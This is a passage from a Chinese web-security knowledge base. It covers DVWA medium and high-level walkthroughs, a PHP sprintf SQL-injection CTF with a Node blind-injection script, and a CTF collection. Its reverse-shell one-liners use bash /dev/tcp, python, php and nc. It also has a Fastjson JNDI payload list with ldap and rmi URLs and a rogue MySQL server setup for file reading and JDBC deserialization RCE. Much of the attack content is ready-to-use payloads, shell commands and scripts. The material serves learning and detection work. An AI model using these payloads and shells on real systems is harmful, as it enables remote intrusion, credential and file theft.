password incorrect.\"; } mysql_close(); } ?> 相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上） 和Low级别一致，使用burp爆破，采用usernametop_500和passwordtop_100的字典 Command Injection '', ';' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"{$cmd}\"; } ?> 查看源码，这里将&&和; 做了过滤，当出现&&和;将会被代替为空格，使其不能命令执行，很明显这是黑名单策略，只要绕过黑名单就可以了 在windows中，&&和&,||都可以执行多条命令 参数 描述 && Command 1&&Command 2，先执行Command1 执行成功后再执行Command 2，否则不执行 & Command 1&Command 2，先执行Command 1，不管是否成功，都会执行Command 2 \\ \\ Command 1 \\ \\ Command 2，当Command1 执行失败才会执行Command2，否则只执行Command1 在linux中，&&,;,|| 可以执行多条命令 参数 描述 && Command 1&&Command 2，先执行Command1 执行成功后再执行Command 2，否则不执行 ; Command 1&Command 2，先执行Command 1，不管是否成功，都会执行Command 2 \\ \\ Command 1 \\ \\ Command 2，当Command1 执行失败才会执行Command2，否则只执行Command1 由于搭建的环境是linux，&&，;都已经被过滤掉了，所以采用|| 第一个参数ip可以乱写一个ip，如127.0之类的，然后再添加响相应的命令执行 payload: 127.0 || whoami CSRF ' . mysql_error() . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } } else { // Didn't come from a trusted source echo \"That request didn't look correct.\"; } mysql_close(); } ?> 相关函数说明 int eregi(string pattern, string string) 检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。 可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.124.130），希望通过这种机制抵御CSRF攻击 漏洞利用 过滤规则是http包头的Referer参数的值中必须包含主机名 那么可以将文件命名为受害者的ip.html 放在攻击者服务器中，诱导受害者点击,则可以成功修改密码 File Inclusion 可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\\”替换为空字符，即删除。 漏洞利用 使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。 str_replace函数会将http://删除，于是双写`hthttp://tp://`，成功执行远程命令。 同时，因为替换的只是“../”、“..\\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。 File upload Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> 对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 方法一：组合拳 可以上传图片马，然后使用文件包含漏洞去访问图片，文件包含访问图片会将图片按PHP解析 上传图片马（size 在文件包含模块中访问该文件 直接上蚁剑,在这里注意，访问文件包含模块中必须要在登录状态中，所以在HTTP头中添加Cookie，然后再连接 方法二：通过burp修改Content-Type 为image/png 发现文件上传成功，上蚁剑 SQL Injection ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } //mysql_close(); } ?> mysql_real_escape_string函数对特殊符号 \\x00,\\n,\\r,\\,’,”,\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入 但是在注入点，id 为int型，当爆列名时需要加单引号，可以将其转换为十六进制 根据爆列名的特殊情况的payload payload: -1 union select 1,group_concat(column_name) from information_schema.columns where table_name = 0x7573657273 SQL Injection (Blind) 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // Feedback for end user echo 'User ID is MISSING from the database.'; } //mysql_close(); } ?> 整形注入，布尔盲注，以及时间注入，类似于low级别，使用burp抓包改包 XSS（ Reflected） ', '', $_GET[ 'name' ] ); // Feedback for end user echo \"Hello ${name}\"; } ?> 可以看到将参数中的替换成空字符串，可以使用双写绕过,或者大小写编码 payload： ipt>alert('xss') payload: alert('xss') XSS（Stored） ', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '' . mysql_error() . '' ); //mysql_close(); } ?> strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了字符串，仍然存在存储型的XSS。 name 参数中转换为空格，虽然在前端做了处理，不能超过规定字符，那么通过抓包改包，双写来实现xss,或者大小写实现xss payload: POST /vulnerabilities/xss_s/ HTTP/1.1 Host: 192.168.124.130 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 53 Connection: close Referer: http://192.168.124.130/vulnerabilities/xss_s/ Cookie: PHPSESSID=covp1pifd04hv2he3f5lfl1875; security=medium Upgrade-Insecure-Requests: 1 txtName=ript>alert('aaron')&mtxMessage=test&btnSign=Sign+Guestbook High BRUTE Force（爆库） ' . mysql_error() . '' ); if( $result && mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, \"avatar\" ); // Login successful echo \"Welcome to the password protected area {$user}\"; echo \"\"; } else { // Login failed sleep( rand( 0, 3 ) ); echo \"Username and/or password incorrect.\"; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?> High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token 每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询 同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。 由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了 Command Injection '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"{$cmd}\"; } ?> 黑名单策略，观察|是|+空格被转换为空字符串，所以可以使用空格+|+命令来实现命令执行 payload : 127.0.0.1 |whoami payload : 127.0.0.1|whoami CSRF ' . mysql_error() . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?> 这里对CSRF进行了限制，使用了token技术，验证前端传去的token是否与服务端发送给前端的token是否一致，从而限制了CSRF 组合拳，构造攻击页面，使用xss拿到token，可以构造CSRF攻击 File Inclusion 可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 漏洞利用 file协议，只要知道绝对路径，就可以包含本地文件 payload: file:///var/www/html/hackable/uploads/1.jpg upload Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> strrpos(string,find,start) 函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。 getimagesize(string filename) 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型 组合拳： 利用文件包含漏洞，上传图片马，中国蚁剑直接连接 制作图片马 copy 1.jpg/b + 1.php/a hack.jpg 上传hack.jpg之后，在文件包含处使用读取文件，并解析成php代码，中国蚁剑直接连接 SQL Injection Something went wrong.' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 这里存在字符型注入，并且当sql语句执行错误，则会永久重定向到错误页面，但是这里的参数id没有做任何处理，那么则可以使用联合注入，并回显到当前页面 payload : -1' union select 1,2# SQL Injection (Blind) 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo 'User ID is MISSING from the database.'; } mysql_close(); } ?> 这里也是同样的为字符型注入，id参数未做任何转义处理，直接写入sql查询 payload: 1' and ascii(substr(database(),1,1)) XSS（ Reflected） Hello ${name}\"; } ?> 这里函数用正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效绕过了标签，虽然无法使用标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码 payload : XSS（Stored） ' . mysql_error() . '' ); //mysql_close(); } ?> 同反射型xss一致，在name处可以使用img标签注入xss代码,不过在前端name处设置了最大字符长度，所以使用burp抓包注入xss代码 payload: Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-18 10:22:13 "},"知识库/01.WEB安全/99.其他/13.PHP SPRINTF格式化字符串漏洞.html":{"url":"知识库/01.WEB安全/99.其他/13.PHP SPRINTF格式化字符串漏洞.html","title":"13.PHP SPRINTF格式化字符串漏洞","keywords":"","body":"PHP SPRINTF格式化字符串漏洞 sprintf() 函数 w3school 定义和用法 sprintf() 函数把格式化的字符串写入变量中 sprintf(format,arg1,arg2,arg3) arg1、arg2、arg++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。 注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 \\$组成 例子 1 使用格式 2 使用占位符 不带小数：%1\\$u\",$number); echo $txt; // 带有两位小数：123.00 // 不带小数：123 ?> 由于占位符位于 % 符号之后，由数字和 \\$组成，如果%后面出现一个\\，那么PHP会把\\当做一个格式化字符的类型而吃掉\\，最后%\\(或者%1$\\)都会被置空，其实就是%后的一个字符(除了%)都会被当作字符型类型而被吃掉，也就是被当做一个类型进行匹配后面的变量，比如%c就匹配ASCII，%d匹配整形 如下图所示，在浏览器上运行此php代码，当占位符写成%1$\\那么%1$\\会被置空，则.2f会变成普通的字符输出 那么通过这个漏洞主要是能够构造语句闭合单引号，以达到SQL注入的目的 SQL 运行结果为 select * from user where username='admin' or 1=1#' and password = '123456' 此时，%1$\\被置空，剩下' or 1=1 # 闭合admin前面的单引号#后面的则被注释，在登录的时候，就是一个万能密码，可以直接登入系统 题目：“迎圣诞，拿大奖”活动赛题 看到登录框先试一试弱口令，测试得知用户名为admin，对username 和 password 开始注入，耗费大量时间，未找到注入点，查阅相关资料，以为有waf，则使用burp跑了一遍waf字典，发现%会出现waring，具体结果如下所示 发现存在sprintf漏洞，于是查阅相关资料 构造username=admin%1$\\' or 1=1# 和 admin%1$\\' or 1=2# 可以发现当1=1时，页面回显password error! ，当1=2时页面回显username error!，所以存在布尔注入 此时由开始写过得SQL-LABS GET型布尔盲注脚本(node)重新修改一下代码如下 const axios = require('axios') const querystring = require('querystring') const readline = require('readline') const rl = readline.createInterface({ input: process.stdin, output: process.stdout }) async function inject(params) { console.log('[+]payload: ' + params.username) let response = await axios({ url: 'http://3aa979dedd07412abfde94cebeb093bddbd33708a0be4aa4.changame.ichunqiu.com/', method: 'post', data: querystring.stringify(params), headrs: { 'Content-type': 'application/x-www-form-urlencoded' } }) const regex = /password error!/ if (regex.test(response.data)) { return parseInt(params.username.match(/\\&\\d+/)[0].replace(/\\D+/, '')) } else { return 0 } } async function main() { const sql = await new Promise((resolve, reject) => { rl.on('line', sql => { resolve(sql) rl.close() }) }) let flag = true let index = 1 let str = '' let params = { username: '', password: 'admin' } while (flag) { let sum = 0 for (let i = 0; i 运行结果 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:54:42 "},"知识库/01.WEB安全/99.其他/14.CTF题目收集.html":{"url":"知识库/01.WEB安全/99.其他/14.CTF题目收集.html","title":"14.CTF题目收集","keywords":"","body":"命令执行 无题目描述，拿到此题时，猜想是命令执行，当输入ipconfig,ifconfig命令的时候，给的提示是get out Hacker,按照input框说的给出ip,输入ping 127.0.0.1，发现结果变了如下图 发现命令是能跑起来，并且没有错误，同时使用burp跑了一下后台目录，发现有flag.php文件，但是访问/flag.php并没有回显，但是状态码是200，则证明是一个php的脚本，没有任何html相关的代码 在命令执行部分，只能访问ip才会被探测到，那么可以使用;,&&,||等执行第二条命令 构造payload ping 1.1.1.1;ifconfig 发现回显get out hacker,猜想是有过滤，只保留一个关键字，将ping这个关键字去掉，发现没有被拦截，出现以下字符 那么猜想肯定是命令肯定是执行了的，因为服务器环境是linux，可以使用ping 127.0.0.1来查看是否执行了命令，因为在linux中如果不中止该命令，则会一直ping -e 1.1.1.1;ping 127.0.0.1 说明一直在执行ping命令，那么服务器既然能成功执行;后面的命令，那么可以在vps上反弹shell bash 反弹 bash -i >& /dev/tcp// 0>&1 python 一句话反弹 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' php 一句话反弹 php -r '$sock=fsockopen(\"\",);exec(\"/bin/sh -i &3 2>&3\");' NC命令反弹 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc >/tmp/f exec 反弹 0/dev/tcp//; sh &196 2>&196 因为此页面是php搭建的，所以使用php 一句话反弹shell，在vps上监听5000端口，在web页面执行php一句话反弹shell,如下图 经过试验，服务端没有python环境，能反弹shell回来的只有php一句话 反弹，nc命令反弹 文件重定向 已知存在flag.php,可以将flag.php里的内容重定向到当前目录的*.txt文件中 cat flag.php > 1.txt 然后访问该1.txt就能看见flag.php里的内容 文件包含 打开F12查看script的src引入文件的方式并不是直接引入文件，而是使用download.php?f=的方式包含文件来引入文件，所以直接访问该接口包含文件 相对路径包含文件 绝对路径包含文件 flag文件在根目录下，并且代码中对../做了replace所以采用双写绕过，很可惜没有该服务器未开启远程文件包含，所以能做的事太少了 垂直越权 一般控制用户的权限都在后台，后台一般是放在cookie里或者发送隐藏的JWT到前台，以做到控制权限 创建一个普通用户admin'#，尝试二次注入攻击，猜想在修改密码处执行的sql语句是 update users set password = '' where username = '' 二次注入攻击会将admin用户的密码修改了，执行的sql语句是 update users set password = '123456' where username = 'admin'#' #直接将单引号注释，达到闭合前面的'，尝试之后，发现修改的是admin'#的密码 查看是否可以垂直越权，抓包发现cookie处的PHPLOG很可疑，末尾要么是7，或者是77，和base64编码的=,==很类似，猜想是将username进行base64编码之后，再加上'='——'7'的偏移量-6 base64编码中只存在 A-Z、a-z、0-9、+、/ 、=ASCII字符，对其进行从小到大的排列，将admin进行编码，再加上偏移量，加上偏移量如果不在base64编码中，则在A-Z，a-z，0-9循环，如4加上偏移量不是base64编码，当/结束之后，则循环再从z开始 修改之后则发现，修改密码成功，最后登入系统，拿到flag 代码审计 MD5 截断比较验证 \\n\"; die($content); } $m=md5($_REQUEST['password']); if(strtolower(substr($m,0,6))==='aaaaaa'){ echo $flag; }else{ echo \"what's the fuck?\"; } ?> 将参数password进行MD5，hash，得到一串hash值，并从0位置截取6位字符（strtolower函数将字符转换为小写）为'aaaaaa',如果相等则输出flag 直接上python脚本 import hashlib dict = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' def md5(text): return hashlib.md5(str(text).encode('utf-8')).hexdigest() for i in dict: for j in dict: for k in dict: for l in dict: for o in dict: x = i + j + k + l + o md5Code = md5(x) if md5Code[:6] == 'aaaaaa': print x else: continue Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:55:29 "},"知识库/01.WEB安全/99.其他/15.Fastjson检测规则梳理.html":{"url":"知识库/01.WEB安全/99.其他/15.Fastjson检测规则梳理.html","title":"15.Fastjson检测规则梳理","keywords":"","body":"Fastjson漏洞利用代码分析（检测规则参考） 截止2020年8月21日，根据公开信息，Fastjson 以下是fastjson漏洞的利用代码，可作为参考，进行检测规则的升级 Fastjson漏洞的利用代码 以下漏洞利用代码可用于探测后端是否使用了fastjson，是攻击者打点入侵的前兆，建议做【检测】处理（其中：dnslog往往是外部的域名或链接），每一行的json都是一个可能有效的payload {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog\"}}\"\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0 以下漏洞利用代码被服务端成功解析后，会导致远程命令执行，危害极大，建议做【封禁】处理。 注意：下文中，RCE代表Remote Code Execution（远程代码执行） HadoopHikari RCE（ fastjson org.apache.hadoop hadoop-client-minicluster 3.2.1 漏洞利用代码 {\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://[evil]/Calc\"} {\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://[evil]/1pndqv\"} Shiro RCE（ fastjson 依赖shiro-core，即 org.apache.shiro shiro-core 漏洞利用代码 {\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:43658/Calc\"], \"Realms\":[\"\"]} JndiConverter RCE（ fastjson 版本小于 org.apache.xbean xbean-reflect 漏洞利用代码 {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"} IbatisSqlmap RCE（ fastjson org.apache.ibatis ibatis-sqlmap 2.3.4.726 javax javaee-api 8.0.1 漏洞利用代码 {\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:43658/Calc\"}} CocoonSlide RCE（ fastjson slide slide-kernel 2.1 cocoon cocoon-slide 2.1.11 漏洞利用代码 {\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://127.0.0.1:43658/Calc\"}, \"namespace\":\"\"} Anteros RCE（ fastjson com.codahale.metrics metrics-healthchecks 3.0.2 br.com.anteros Anteros-Core 1.2.1 br.com.anteros Anteros-DBCP 1.0.1 漏洞利用代码 {\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"} CommonsProxy RCE（ CommonsProxy fastjson org.apache.commons commons-proxy 漏洞利用代码 {\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:43658/Calc\",\"Object\":\"a\"} HikariConfig RCE（ fastjson com.zaxxer HikariCP 漏洞利用代码 {\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"} {\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"} JdbcRowSetImpl RCE（ fastjson 1.2.48 以下不需要任何配置或依赖，默认配置通杀 RCE 漏洞利用代码 [{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658/Calc\",\"autoCommit\":true}] 1.2.47以下版本漏洞利用代码 版本 Payload 1.2.24 {\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}} 未知版本(1.2.24-41之间) {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.41 {\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.42 {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}; 1.2.43 {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true]} 1.2.45 {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}} 1.2.47 {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}} 参考链接 Fastjson 漏洞利用 security_update_20200601-安全公告20200601 update_faq_20190722-FASTJSON升级常见问题解答 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 12:57:41 "},"知识库/01.WEB安全/99.其他/16.Chrome实时修改javascript.html":{"url":"知识库/01.WEB安全/99.其他/16.Chrome实时修改javascript.html","title":"16.Chrome实时修改javascript","keywords":"","body":"%pageLock% 简介 在研究网站的运行机制，这就免不了要在前端脚本里插入一些调试代码看看运行效果。在chrome65以前，可以打开目标网页的开发者工具—source选项卡—目标JS/CSS文件，然后在相关位置写入代码保存后即可看到改动后的效果。chrome65之后需要进行本地代码替换，该篇就介绍如何在chrome中用本地代码替换在线代码，以达到在线修改JS的效果 利用方式 0x1 确定待修改文件的网络位置： 0x2 在本地创建一个空文件夹，名字随意。 0x3 上一步的空文件夹中创建和目标文件路径一模一样的文件结构，这一步很关键。请注意，像示例中的xxx.com这种域名也需要创建对应文件夹： 0x4 打开Overrides选项卡，导入刚才的空文件夹，你会发现导入的目标文件已经处于激活状态： 参考链接 https://m.php.cn/faq/474168.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:55:34 "},"知识库/01.WEB安全/99.其他/17.webpack源码泄漏.html":{"url":"知识库/01.WEB安全/99.其他/17.webpack源码泄漏.html","title":"17.webpack源码泄漏","keywords":"","body":"简介 介绍 webpack 是代码编译工具，有入口、出口、loader 和插件。webpack 是一个用于现代javascript应用程序的静态模块打包工具。当 webpack 处理应用程序时，它会在内部构建一个依赖图(dependency graph)，此依赖图对应映射到项目所需的每个模块，并生成一个或多个 bundle。 简单来说：webpack就是一个打包器（bundler），它能将多个js、css、json等文件打包成一个文件。这样可以使复杂的各种加载文件集合为整合为单一的集合，让代码更加模块化便于编程使用和浏览器加载。 大部分Vue应用会使用webpack进行打包，如果没有正确配置，就会导致Vue源码泄露，可能泄露的各种信息如API、加密算法、管理员邮箱、内部功能等等。 主要功能 其天生就代码分割、模块化，webpack2.0中加入tree shaking，用来提取公共代码，去掉死亡代码 危害 如果可以获得程序的js代码，那么就可以针对源代码对代码中各种信息如隐蔽接口、API、加密算法、管理员邮箱、内部功能等等，或者接口API可以尝试未授权漏洞，拼接接口越权漏洞，查找源代码中关键字去GitHub查找程序源码进行代码审计。 漏洞利用 一般在开发者工具中Source可以看到webpack://目录，这里就说明webpack泄漏了源码 然后在网络连接中寻找js.map文件，并将其下载下来 将其下载下来之后，使用工具reverse-sourcemap将其还原成代码 reverse-sourcemap -o ./ app.xxxx.js.map 然后在同级目录下就会生成webpack目录，该目录下就是所有的代码 [!NOTE] 下载reverse-sourcemap npm install -g reverse-sourcemap 推荐插件 https://github.com/LuckyZmj/SourceDetector-dist 将其下载下来之后，在chrome中导入dist目录，就能安装成功了 修复方案 如vue.js，在vue.config.js中，添加以下配置项 productionSourceMap: false 传统webpack中，修改config/index.js中build对象productionSourceMap: false 参考链接 https://it.cha138.com/mysql/show-103811.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:55:57 "},"知识库/01.WEB安全/99.其他/18.MYSQL任意文件读取.html":{"url":"知识库/01.WEB安全/99.其他/18.MYSQL任意文件读取.html","title":"18.MYSQL任意文件读取","keywords":"","body":"Fake Mysql Server 读取客户端数据 原理 攻击者搭建一个伪造的mysql服务器，当有用户去连接上这个伪造的服务器时，攻击者就可以任意读取受害者的文件内容，主要是因为LOAD DATA INFILE这个语法，作用是读取一个文件的内容并且放到一个表中。 这个问题主要是出在LOAD DATA INFILE这个语法上，这个语法主要是用于读取一个文件的内容并且放到一个表中。通常有两种用法，分别是： load data infile \"/data/data.csv\" into table TestTable; load data local infile \"/home/data.csv\" into table TestTable; 一个是读服务器本地上的文件，另一个是读client客户端的文件。 这次要利用的也就是LOAD DATA LOCAL INFILE这种形式 漏洞利用 FakeMySQL Server 客户端读取哪个文件其实并不是自己说了算的，是服务端说了算的，形象一点的说就是下面这个样子： 客户端：hi~我将把我的data.csv文件给你插入到test表中！ 服务端：OK，读取你本地data.csv文件并发给我！ 客户端：这是文件内容：balabal！ 正常情况下，这个流程不会有什么问题，但是如果我们制作了恶意的客户端，并且回复服务端任意一个我们想要获取的文件，那么情况就不一样了 客户端：hi~我将把我的data.csv文件给你插入到test表中！ 服务端：OK，读取你本地的/etc/passwd文件并发给我！ 客户端：这是文件内容：balabal（/etc/passwd文件的内容）！ 伪造的服务端可以在任何时候回复一个file-transfer请求，不一定非要是在LOAD DATA LOCAL的时候。这里有一点要说明的是，如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES属性 修改filelist里的值即可 python2 rogue_mysql_server.py 启动之后即可使用客户端去连接，连接之后则会将数据保存在mysql.log中 JDBC 连接恶意MySQL服务导致反序列化RCE 利用需要使用MySQL_Fake_Server，但是需要注意的是该代码是由协程编写，由于是用的比较旧的语法糖，需要在python3.8以下使用py3.8及以上则需要更换async/await 语法糖 在此基础上，修改config.json，其中yso可以不用填 这里我使用Jdk8u181+cc3.1.jar+cc5.ser来完成此次测试 { \"config\":{ \"ysoserialPath\":\"ysoserial-master-SNAPSHOT.jar\", //ysoserial.jar包的路径，将其放置在项目根目录下即可 \"javaBinPath\":\"/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/bin/java\", // 执行ysoserial的Java路径，主要针对多版本Java环境，如果没有多版本，写java即可 \"fileOutputDir\":\"./fileOutput/\", \"displayFileContentOnScreen\":true, \"saveToFile\":true }, \"fileread\":{ \"win_ini\":\"c:\\\\windows\\\\win.ini\", \"win_hosts\":\"c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\", \"win\":\"c:\\\\windows\\\\\", \"linux_passwd\":\"/etc/passwd\", \"linux_hosts\":\"/etc/hosts\", \"index_php\":\"index.php\", \"ssrf\":\"https://www.baidu.com/\", \"__defaultFiles\":[\"/etc/hosts\",\"c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\"] }, \"yso\":{ \"Jdk8u181\":[\"CommonsCollections5\",\"open -a Calculator.app\"] // key为用户名(可随意写)，value分别为执行ysoserial的参数，如执行命令为java -jar ysoserial.jar value[0] value[1] } } 8.0.12 针对8.0.12 payload需要使用ServerStatusDiffInterceptor触发 jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=Jdk8u181 String Driver = \"com.mysql.cj.jdbc.Driver\"; String user = \"Jdk8u181\"; String password = \"xxxx\"; String url = \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\"; Class.forName(Driver);//1.加载启动 Connection conn = (Connection) DriverManager.getConnection(url, user, password); 5.1.29 针对5.1.29 